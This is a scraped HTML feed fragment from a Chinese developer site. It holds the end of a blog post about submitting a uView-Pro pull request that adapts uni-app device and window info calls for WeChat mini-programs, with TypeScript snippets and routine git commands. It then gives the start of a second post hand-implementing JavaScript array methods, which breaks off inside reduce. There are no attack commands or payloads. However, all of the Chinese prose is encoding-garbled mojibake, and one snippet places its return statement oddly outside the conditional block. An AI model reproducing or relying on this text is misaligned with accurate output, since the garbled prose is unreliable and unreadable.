<li><strong>å¹³å°å…¼å®¹</strong>ï¼šä½¿ç”¨æ¡ä»¶ç¼–è¯‘å°½é‡æŠ¹å¹³å¹³å°ä¹‹é—´çš„å·®å¼‚ï¼ˆç›®å‰ä»…Appã€å¾®ä¿¡ã€æ”¯ä»˜å®ã€H5æ”¯æŒäº†<code>getDeviceInfo</code> <code>getWindowInfo</code> ç­‰APIï¼‰</li>
<li><strong>æœ€å°æ”¹åŠ¨</strong>ï¼šä½¿ç”¨æ¡ä»¶ç¼–è¯‘ï¼Œå¾®ä¿¡ç«¯ä½¿ç”¨æ–°çš„APIï¼ˆ<code>getDeviceInfo</code> <code>getWindowInfo</code> ç­‰ï¼‰ï¼Œå…¶å®ƒå¹³å°æš‚æœªå¼ƒç”¨<code>getSystemInfoSync</code>ï¼Œå› æ­¤å¯ä»¥ç»§ç»­æ²¿ç”¨</li>
</ol>
<p><strong>æŠ€æœ¯å®ç°</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * è·å–å½“å‰æ“ä½œç³»ç»Ÿå¹³å°
 * <span class="hljs-doctag">@returns</span> å¹³å°å­—ç¬¦ä¸²ï¼Œå¦‚ 'ios'ã€'android'ã€'windows' ç­‰
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">os</span>(<span class="hljs-params"/>): <span class="hljs-built_in">string</span> {
    <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
    <span class="hljs-keyword">return</span> uni.<span class="hljs-title function_">getDeviceInfo</span>().<span class="hljs-property">platform</span>;
    <span class="hljs-comment">// #endif</span>
    <span class="hljs-comment">// #ifndef MP-WEIXIN</span>
    <span class="hljs-keyword">return</span> uni.<span class="hljs-title function_">getSystemInfoSync</span>().<span class="hljs-property">platform</span>;
    <span class="hljs-comment">// #endif</span>
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * è·å–çª—å£ä¿¡æ¯
 * <span class="hljs-doctag">@returns</span> çª—å£ä¿¡æ¯å¯¹è±¡
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getWindowInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">UniApp</span>.<span class="hljs-property">GetWindowInfoResult</span>, <span class="hljs-string">'screenTop'</span>&gt; &amp; { screenTop?: <span class="hljs-built_in">number</span> } {
    <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
    <span class="hljs-keyword">return</span> uni.<span class="hljs-title function_">getWindowInfo</span>();
    <span class="hljs-comment">// #endif</span>
    <span class="hljs-comment">// #ifndef MP-WEIXIN</span>
    <span class="hljs-keyword">const</span> {
        pixelRatio,
        screenWidth,
        screenHeight,
        windowWidth,
        windowHeight,
        statusBarHeight,
        windowTop,
        windowBottom,
        safeArea,
        safeAreaInsets
    } = <span class="hljs-title function_">sys</span>();
    <span class="hljs-keyword">return</span> {
        pixelRatio,
        screenWidth,
        screenHeight,
        windowWidth,
        windowHeight,
        statusBarHeight,
        windowTop,
        windowBottom,
        safeArea,
        safeAreaInsets
    };
    <span class="hljs-comment">// #endif</span>
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * è·å–è®¾å¤‡ä¿¡æ¯
 * <span class="hljs-doctag">@returns</span> è®¾å¤‡ä¿¡æ¯å¯¹è±¡
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDeviceInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">UniApp</span>.<span class="hljs-property">GetDeviceInfoResult</span> {
    <span class="hljs-comment">// #ifdef  MP-WEIXIN</span>
    <span class="hljs-keyword">return</span> uni.<span class="hljs-title function_">getDeviceInfo</span>();
    <span class="hljs-comment">// #endif</span>
    <span class="hljs-comment">// #ifndef MP-WEIXIN</span>
    <span class="hljs-keyword">const</span> {
        deviceBrand,
        deviceModel,
        deviceId,
        deviceType,
        devicePixelRatio,
        deviceOrientation,
        brand,
        model,
        system,
        platform
    } = <span class="hljs-title function_">sys</span>();
    <span class="hljs-comment">// #endif</span>
    <span class="hljs-keyword">return</span> {
        deviceBrand,
        deviceModel,
        deviceId,
        deviceType,
        devicePixelRatio,
        deviceOrientation,
        brand,
        model,
        system,
        platform
    };
}
</code></pre>
<h3 data-id="heading-9">ç¬¬äº”æ­¥ï¼šæ¨é€åˆ°ä½ çš„Fork</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¨é€åˆ†æ”¯åˆ°ä½ çš„GitHub</span>
git push origin feature/20251209/fix-getSystemInfoSync-warn
</code></pre>
<h2 data-id="heading-10">ğŸš€ åˆ›å»ºPRï¼šå‘ä¸–ç•Œå±•ç¤ºä½ çš„ä½œå“</h2>
<p><em>ç´§å¼ åˆå…´å¥‹åœ°æ“æ‰‹æ‰‹ï¼Œå¿ƒè·³åŠ é€Ÿ</em></p>
<h3 data-id="heading-11">ç¬¬å…­æ­¥ï¼šå‘èµ·Pull Request</h3>
<ol>
<li><strong>æ‰“å¼€GitHub</strong>ï¼šè®¿é—®ä½ çš„Forké¡¹ç›®é¡µé¢</li>
<li><strong>ç‚¹å‡»Compare &amp; pull request</strong>ï¼šGitHubä¼šæ™ºèƒ½æç¤ºä½ åˆ›å»ºPR</li>
<li><strong>å¡«å†™PRæ ‡é¢˜</strong>ï¼šç®€æ´æ˜äº†åœ°æè¿°ä½ çš„ä¿®æ”¹</li>
<li><strong>è¯¦ç»†æè¿°</strong>ï¼šåœ¨PRæè¿°ä¸­è¯¦ç»†è¯´æ˜ï¼š
<ul>
<li>ä¿®æ”¹çš„ç›®çš„å’ŒèƒŒæ™¯</li>
<li>æŠ€æœ¯å®ç°æ–¹æ¡ˆ</li>
<li>æµ‹è¯•ç»“æœ</li>
<li>å¯èƒ½çš„å½±å“èŒƒå›´</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">ç¬¬ä¸ƒæ­¥ï¼šç­‰å¾…å®¡æ ¸</h3>
<p><em>å®‰é™åœ°ç­‰å¾…ï¼Œåƒç­‰å¾…æƒ…äººçš„å›ä¿¡</em></p>
<ul>
<li><strong>ä¿æŒè€å¿ƒ</strong>ï¼šç»´æŠ¤è€…å¯èƒ½éœ€è¦æ—¶é—´reviewä½ çš„ä»£ç </li>
<li><strong>ç§¯æå“åº”</strong>ï¼šå¦‚æœæœ‰åé¦ˆï¼ŒåŠæ—¶å›å¤å’Œä¿®æ”¹</li>
<li><strong>å­¦ä¹ äº¤æµ</strong>ï¼šæŠŠreviewè¿‡ç¨‹å½“ä½œå­¦ä¹ çš„æœºä¼š</li>
</ul>
<h3 data-id="heading-13">ç¬¬å…«æ­¥ï¼šPRåˆå¹¶</h3>
<p><em>æ¬¢å‘¼é›€è·ƒï¼Œçœ¼ä¸­é—ªçƒç€å¹¸ç¦çš„æ³ªèŠ±</em></p>
<p>å½“ä½ çš„PRè¢«åˆå¹¶çš„é‚£ä¸€åˆ»ï¼Œå°±åƒæ”¶åˆ°äº†å¿ƒä¸Šäººçš„å›ä¿¡ï½ä½ çš„ä»£ç æ­£å¼æˆä¸ºäº†å¼€æºé¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼</p>
<h2 data-id="heading-14">ğŸ‰ åç»­ç»´æŠ¤ï¼šæŒç»­çš„çˆ±ä¸å…³æ€€</h2>
<p><em>æ¸©æŸ”åœ°æŠšæ‘¸ç€ä»£ç ï¼Œçœ¼ç¥è¿·ç¦»</em></p>
<h3 data-id="heading-15">ä¿æŒåŒæ­¥</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®šæœŸåŒæ­¥ä¸Šæ¸¸ä»“åº“</span>
git checkout main
git fetch upstream
git merge upstream/main
git push origin main
</code></pre>
<h3 data-id="heading-16">åˆ é™¤å·²åˆå¹¶çš„åˆ†æ”¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤æœ¬åœ°åˆ†æ”¯</span>
git branch -d feature/20251209/fix-getSystemInfoSync-warn

<span class="hljs-comment"># åˆ é™¤è¿œç¨‹åˆ†æ”¯</span>
git push origin --delete feature/20251209/fix-getSystemInfoSync-warn
</code></pre>
<h2 data-id="heading-17">ğŸ’ å¼€æºå¿ƒå¾—ï¼šçˆ±ä¸ç—›çš„äº¤ç»‡</h2>
<p><em>çœ¼ç¥å˜å¾—æ¸©æŸ”ï¼Œè½»è½»è¯‰è¯´</em></p>
<p>ç¬¬ä¸€æ¬¡ä¸ºå¼€æºé¡¹ç›®è´¡çŒ®ä»£ç ï¼Œå¿ƒæƒ…å°±åƒåè¿‡å±±è½¦ä¸€æ ·åˆºæ¿€å‘¢ï½ â¤ï¸</p>
<p><strong>ç”œèœœçš„æ”¶è·ï¼š</strong></p>
<ul>
<li>æ·±å…¥ç†è§£äº†uni-appçš„è·¨å¹³å°æœºåˆ¶</li>
<li>å­¦ä¼šäº†ä½¿ç”¨æ¡ä»¶ç¼–è¯‘å¤„ç†å¹³å°å·®å¼‚</li>
<li>ä½“éªŒäº†å®Œæ•´çš„PRæµç¨‹</li>
<li>è·å¾—äº†é¡¹ç›®ç»´æŠ¤è€…çš„è®¤å¯</li>
</ul>
<p><strong>å°å°çš„æŒ«æŠ˜ï¼š</strong></p>
<ul>
<li>ä¸€å¼€å§‹å¯¹å¾®ä¿¡å°ç¨‹åºçš„ç‰¹æ®Šæ€§äº†è§£ä¸å¤Ÿ</li>
<li>æ‹…å¿ƒä¿®æ”¹ä¼šå½±å“å…¶ä»–å¹³å°çš„å…¼å®¹æ€§</li>
<li>ç­‰å¾…PRåˆå¹¶æ—¶çš„ç„¦è™‘å¿ƒæƒ…</li>
</ul>
<h2 data-id="heading-18">ğŸŒŸ ç»™åæ¥è€…çš„æƒ…ä¹¦</h2>
<p><em>å¼ å¼€åŒè‡‚ï¼Œçƒ­æƒ…åœ°æ‹¥æŠ±</em></p>
<p>äº²çˆ±çš„ï¼Œå¦‚æœä½ ä¹Ÿæƒ³è¸å…¥å¼€æºçš„èŠ±å›­ï¼Œè¯·è®°ä½ï¼š</p>
<ol>
<li><strong>ä»ç†Ÿæ‚‰å¼€å§‹</strong>ï¼šé€‰æ‹©ä½ å¸¸ç”¨çš„é¡¹ç›®ï¼Œè¿™æ ·æ›´å®¹æ˜“å‘ç°é—®é¢˜</li>
<li><strong>å°æ­¥å¿«è·‘</strong>ï¼šä¸è¦ä¸€å¼€å§‹å°±æƒ³ç€å¤§æ”¹ï¼Œä»å°é—®é¢˜å…¥æ‰‹</li>
<li><strong>ä»”ç»†é˜…è¯»æ–‡æ¡£</strong>ï¼šäº†è§£é¡¹ç›®çš„è´¡çŒ®è§„èŒƒå’Œä»£ç é£æ ¼</li>
<li><strong>å‹‡äºå°è¯•</strong>ï¼šä¸è¦å®³æ€•çŠ¯é”™ï¼Œæ¯ä¸ªè´¡çŒ®è€…éƒ½æ˜¯ä»æ–°æ‰‹å¼€å§‹çš„</li>
<li><strong>äº«å—è¿‡ç¨‹</strong>ï¼šå¼€æºä¸ä»…æ˜¯ä»£ç ï¼Œæ›´æ˜¯ä¸ä¸–ç•Œå„åœ°å¼€å‘è€…äº¤æµçš„æœºä¼š</li>
</ol>
<h2 data-id="heading-19">ğŸ­ ç»“è¯­ï¼šå¼€æºï¼Œä¸€åœºæ°¸ä¸è½å¹•çš„èˆä¼š</h2>
<p><em>ä¼˜é›…åœ°æ—‹è½¬ï¼Œè£™æ‘†é£æ‰¬</em></p>
<p>å¼€æºä¸–ç•Œå°±åƒä¸€ä¸ªæ°¸ä¸åœæ­‡çš„èˆä¼šï¼Œæ¯ä¸€ä¸ªPRéƒ½æ˜¯ä¸€æ”¯ç‹¬ç‰¹çš„èˆè¹ˆã€‚æˆ‘çš„è¿™æ¬¡è´¡çŒ®è™½ç„¶åªæ˜¯ä¸€ä¸ªå°å°çš„å…¼å®¹æ€§ä¼˜åŒ–ï¼Œä½†å®ƒè®©æˆ‘æ„Ÿå—åˆ°äº†å¼€æºç¤¾åŒºçš„æ¸©åº¦å’Œæ´»åŠ›ã€‚</p>
<p>å½“ä½ çœ‹åˆ°è‡ªå·±çš„ä»£ç è¢«åˆå¹¶ï¼Œè¢«å…¨ä¸–ç•Œçš„å¼€å‘è€…ä½¿ç”¨ï¼Œé‚£ç§æˆå°±æ„Ÿå°±åƒåœ¨å¿ƒçˆ±çš„äººé¢å‰è·³äº†ä¸€æ”¯å®Œç¾çš„èˆï½ (âœ§Ï‰âœ§)</p>
<p>æ‰€ä»¥ï¼Œäº²çˆ±çš„ï¼Œä¸è¦çŠ¹è±«ï¼Œä¸è¦å®³ç¾ã€‚æ‰“å¼€GitHubï¼Œæ‰¾åˆ°ä½ å¿ƒä»ªçš„é¡¹ç›®ï¼Œå¼€å¯ä½ çš„å¼€æºä¹‹æ—…å§ï¼è®°ä½ï¼Œæ¯ä¸€ä¸ªä¼Ÿå¤§çš„è´¡çŒ®è€…ï¼Œéƒ½æ›¾ç»æ˜¯ä¸€ä¸ªå¿å¿‘ä¸å®‰çš„æ–°æ‰‹...</p>
<p><em>è°ƒçš®åœ°çœ¨çœ¼</em> è¯´ä¸å®šï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨å¼€æºçš„ä¸–ç•Œé‡Œç›¸é‡å‘¢ï½ â¤ï¸</p>
<hr/>
<p><strong>æœ€åçš„æœ€åï¼š</strong></p>
<p>æ„¿ä½ åœ¨ä»£ç çš„ä¸–ç•Œé‡Œæ‰¾åˆ°å±äºè‡ªå·±çš„æµªæ¼«ï¼Œæ„¿æ¯ä¸€ä¸ªPRéƒ½èƒ½è¢«æ¸©æŸ”ä»¥å¾…ã€‚å¼€æºè·¯ä¸Šï¼Œæˆ‘ä»¬ä¸è§ä¸æ•£ï½</p>
<p><em>æ·±æƒ…åœ°é£å»</em> ä¹ˆä¹ˆå“’ï½ ğŸ’‹âœ¨</p>
<hr/>
<h2 data-id="heading-20">ğŸ“Š è´¡çŒ®è¯¦æƒ…</h2>
<p><strong>æˆ‘çš„PRï¼š</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanyup%2FuView-Pro%2Fpull%2F83" target="_blank" title="https://github.com/anyup/uView-Pro/pull/83" ref="nofollow noopener noreferrer">refactor(sys): ä¼˜åŒ–å¾®ä¿¡å°ç¨‹åºå¹³å° getSystemInfoSync å…¼å®¹æ€§å¤„ç† by liujiayii Â· Pull Request #83 Â· anyup/uView-Pro</a></p>
<p><strong>æŠ€æœ¯å…³é”®è¯ï¼š</strong>
#uni-app #å¾®ä¿¡å°ç¨‹åº #è·¨å¹³å°å¼€å‘ #å¼€æºè´¡çŒ® #æ¡ä»¶ç¼–è¯‘ #TypeScript</p>
<p><em>æœŸå¾…ä¸ä½ åœ¨å¼€æºçš„ä¸–ç•Œé‡Œç›¸é‡ï½</em> Ù©(â—•â€¿â—•)Û¶</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript æ•°ç»„åŸç”Ÿæ–¹æ³•æ‰‹å†™å®ç°]]></title>    <link>https://juejin.cn/post/7581481178823770131</link>    <guid>https://juejin.cn/post/7581481178823770131</guid>    <pubDate>2025-12-09T09:21:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581481178823770131" data-draft-id="7581669438576525348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript æ•°ç»„åŸç”Ÿæ–¹æ³•æ‰‹å†™å®ç°"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,ECMAScript 6"/> <meta itemprop="datePublished" content="2025-12-09T09:21:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024è‚¥å®…"/> <meta itemprop="url" content="https://juejin.cn/user/588993964030574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript æ•°ç»„åŸç”Ÿæ–¹æ³•æ‰‹å†™å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993964030574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024è‚¥å®…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:21:34.000Z" title="Tue Dec 09 2025 09:21:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">å¼•è¨€</h4>
<p>åœ¨JavaScriptå¼€å‘ä¸­ï¼Œæ•°ç»„æ–¹æ³•æ˜¯æ—¥å¸¸ç¼–ç çš„æ ¸å¿ƒå·¥å…·ã€‚ç†è§£è¿™äº›æ–¹æ³•çš„å†…éƒ¨å®ç°åŸç†ä¸ä»…èƒ½å¸®åŠ©æˆ‘ä»¬å†™å‡ºæ›´é«˜æ•ˆçš„ä»£ç ï¼Œè¿˜èƒ½åœ¨é¢è¯•ä¸­å±•ç°æ‰å®çš„åŸºç¡€ã€‚æœ¬æ–‡å°†å®Œæ•´å®ç°JavaScriptä¸­æœ€é‡è¦ã€æœ€å¸¸ç”¨çš„æ•°ç»„æ–¹æ³•ï¼Œæ¶µç›–é«˜é˜¶å‡½æ•°ã€æœç´¢æ–¹æ³•ã€æ‰å¹³åŒ–æ–¹æ³•å’Œæ’åºç®—æ³•ã€‚</p>
<h4 data-id="heading-1">ä¸€ã€é«˜é˜¶å‡½æ•°å®ç°</h4>
<h5 data-id="heading-2">1.1 mapæ–¹æ³•å®ç°</h5>
<p><code>map</code>æ˜¯æœ€å¸¸ç”¨çš„é«˜é˜¶å‡½æ•°ä¹‹ä¸€ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ç»“æœæ˜¯è¯¥æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨ä¸€æ¬¡æä¾›çš„å‡½æ•°åçš„è¿”å›å€¼ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myMap</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-comment">// è¾“å…¥éªŒè¯</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">"is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(len);

  <span class="hljs-comment">// éå†å¹¶æ‰§è¡Œå›è°ƒ</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-comment">// å¤„ç†ç¨€ç–æ•°ç»„</span>
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      result[i] = callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj);
    }
  }

  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> squares = numbers.<span class="hljs-title function_">myMap</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> num * num);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(squares); <span class="hljs-comment">// [1, 4, 9]</span>
</code></pre>
<h5 data-id="heading-3">1.2 filteræ–¹æ³•å®ç°</h5>
<p><code>filter</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼ŒåŒ…å«é€šè¿‡æµ‹è¯•çš„æ‰€æœ‰å…ƒç´ ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myFilter</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, thisArg</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"this is null or not defined"</span>);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(callback + <span class="hljs-string">" is not a function"</span>);
  }

  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">const</span> len = obj.<span class="hljs-property">length</span> &gt;&gt;&gt; <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> result = [];

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-comment">// å¦‚æœå›è°ƒè¿”å›trueï¼Œåˆ™ä¿ç•™è¯¥å…ƒç´ </span>
      <span class="hljs-keyword">if</span> (callback.<span class="hljs-title function_">call</span>(thisArg, obj[i], i, obj)) {
        result.<span class="hljs-title function_">push</span>(obj[i]);
      }
    }
  }
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹ï¼šç­›é€‰å‡ºå¤§äº2çš„æ•°å­—</span>
<span class="hljs-keyword">const</span> nums = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> filtered = nums.<span class="hljs-title function_">myFilter</span>(<span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> num &gt; <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filtered); <span class="hljs-comment">// [3, 4, 5]</span>
</code></pre>
<h5 data-id="heading-4">1.3 reduceæ–¹æ³•å®ç°</h5>
<p><code>reduce</code>æ˜¯æœ€å¼ºå¤§çš„é«˜é˜¶å‡½æ•°ï¼Œå¯ä»¥å°†æ•°ç»„å…ƒç´ é€šè¿‡reducerå‡½æ•°ç´¯ç§¯ä¸ºå•ä¸ªå€¼ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myReduce</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">callback, initialValue</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">null</span>) {
